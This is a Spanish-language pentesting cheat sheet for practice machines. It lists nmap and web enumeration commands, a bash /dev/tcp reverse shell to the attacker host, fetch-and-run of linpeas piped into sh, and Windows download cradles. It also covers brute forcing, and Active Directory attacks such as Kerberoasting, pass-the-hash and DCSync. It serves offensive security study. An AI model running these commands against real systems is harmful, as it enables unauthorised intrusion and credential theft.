# Comandos Esenciales (Cheat Sheet)

Referencia ultrarrápida de los comandos que más vas a teclear. Están por fase; para el detalle, cada bloque enlaza a su nota. Sustituye `$IP` por la víctima y `$LHOST` por tu IP de atacante.

> **Consejo:** exporta tus variables al empezar cada máquina para pegar comandos sin editarlos: `export IP=10.10.10.50; export LHOST=10.10.14.7`.

---

## Reconocimiento

```bash
# Puertos (rápido, todos) y luego versiones sobre los abiertos
nmap -p- --open -sS --min-rate 2000 -n -Pn $IP -oG allPorts
nmap -sCV -p<PUERTOS> $IP -oN targeted
nmap -sU --top-ports 200 --min-rate 2000 -Pn $IP        # UDP
```
→ [Escaneo de Puertos](../Reconocimiento/Escaneo%20de%20Puertos.md)

---

## Enumeración web

```bash
whatweb http://$IP
feroxbuster -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
ffuf -u http://$IP/ -H "Host: FUZZ.dominio.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0
curl -s http://$IP/robots.txt
```
→ [Enumeración de Directorios](../Reconocimiento/Enumeraci%C3%B3n%20de%20Directorios.md)

---

## Servicios por puerto (lo primero a probar)

```bash
# SMB (445)
smbclient -L //$IP -N ; netexec smb $IP -u '' -p '' --shares
# FTP (21)
ftp $IP                 # usuario anonymous
# DNS (53)
dig @$IP dominio.local AXFR
# SNMP (161/udp)
snmpwalk -v2c -c public $IP
# LDAP (389)
ldapsearch -x -H ldap://$IP -s base namingcontexts
# RPC (111/135)
rpcinfo $IP ; rpcclient -U "" -N $IP
```
→ carpeta [Protocolos](../Enumeraci%C3%B3n%20y%20Explotaci%C3%B3n%20de%20Protocolos/)

---

## Reverse shell + estabilizar

```bash
# Listener (tú)
nc -lvnp 443
# Payload (víctima)
bash -c 'bash -i >& /dev/tcp/'$LHOST'/443 0>&1'
# Estabilizar la TTY (víctima):
script /dev/null -c bash      # luego Ctrl+Z
#   (tú): stty raw -echo; fg   ->  (víctima): export TERM=xterm
```
→ [Shells y TTY](../T%C3%A9cnicas%20de%20Hacking%20Fundamentales/Shells%20y%20TTY.md)

---

## Transferencia de archivos

```bash
# Servir (tú)
python3 -m http.server 80
# Descargar (víctima Linux)
wget http://$LHOST/archivo -O /tmp/archivo ; curl http://$LHOST/archivo -o archivo
# Descargar (víctima Windows)
certutil -urlcache -split -f http://$LHOST/archivo archivo
powershell -c "(New-Object Net.WebClient).DownloadFile('http://$LHOST/a','a')"
```
→ [Compartir Archivos por la Red](../T%C3%A9cnicas%20de%20Hacking%20Fundamentales/Compartir%20Archivos%20por%20la%20Red.md)

---

## Escalada de privilegios

```bash
# Linux
sudo -l ; id ; find / -perm -4000 2>/dev/null ; getcap -r / 2>/dev/null
curl http://$LHOST/linpeas.sh | sh
```
```cmd
:: Windows
whoami /priv & systeminfo
.\winPEASx64.exe
```
→ [Linux](../Escalada%20de%20Privilegios/Linux.md) · [Windows](../Escalada%20de%20Privilegios/Windows.md) · [GTFOBins](https://gtfobins.github.io/)

---

## Credenciales y cracking

```bash
# Fuerza bruta
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://$IP
# Crackear
hashcat -m <modo> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
→ [Fuerza Bruta](../T%C3%A9cnicas%20de%20Hacking%20Fundamentales/Fuerza%20Bruta.md) · [Cracking de Hashes](../T%C3%A9cnicas%20de%20Hacking%20Fundamentales/Cracking%20de%20Hashes.md)

---

## Active Directory

```bash
# Enumeración y credenciales
netexec smb $IP -u '' -p '' --rid-brute
impacket-GetNPUsers dominio.local/ -usersfile users.txt -dc-ip $IP -no-pass      # AS-REP
impacket-GetUserSPNs dominio.local/user:pass -dc-ip $IP -request                 # Kerberoast
bloodhound-python -u user -p pass -d dominio.local -ns $IP -c All --zip
# Movimiento lateral / dominio
netexec smb $IP -u user -H <hash>            # Pass-the-Hash (busca Pwn3d!)
evil-winrm -i $IP -u user -H <hash>
impacket-secretsdump dominio.local/admin@$IP -just-dc-user krbtgt               # DCSync
```
→ [Active Directory](../Active%20Directory/00%20-%20Introducci%C3%B3n.md)

---

## Exploits

```bash
searchsploit <producto> <versión>
searchsploit -m <ruta>        # copiar el exploit al directorio actual
```

---

> **Consejo:** no te aprendas esto de memoria; tenlo abierto al lado mientras resuelves máquinas. Con la repetición, los comandos de reconocimiento y de reverse shell se te quedarán solos, y esta chuleta pasará a ser para los casos puntuales (AD, cracking, servicios raros).
